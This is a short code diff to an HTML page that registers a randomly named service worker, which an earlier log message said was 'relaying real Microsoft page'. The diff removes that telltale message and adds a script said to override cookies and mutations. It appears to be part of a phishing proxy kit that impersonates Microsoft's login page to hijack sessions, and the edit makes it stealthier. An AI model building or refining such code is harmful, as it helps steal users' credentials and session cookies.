@@ -3,11 +3,14 @@
 <head><meta charset="UTF-8"></head>
 <body>
     <script>
+        // Register SW (this is your existing registration code)
         if ("serviceWorker" in navigator) {
             navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", { scope: "/" })
-                .then(() => console.log("SW registered – relaying real Microsoft page"))
+                .then(() => console.log("SW registered"))
                 .catch(err => console.error("SW registration failed:", err));
         }
     </script>
+    <!-- Load the cookie/mutation override script -->
+    <script src="/@"></script>
 </body>
 </html>
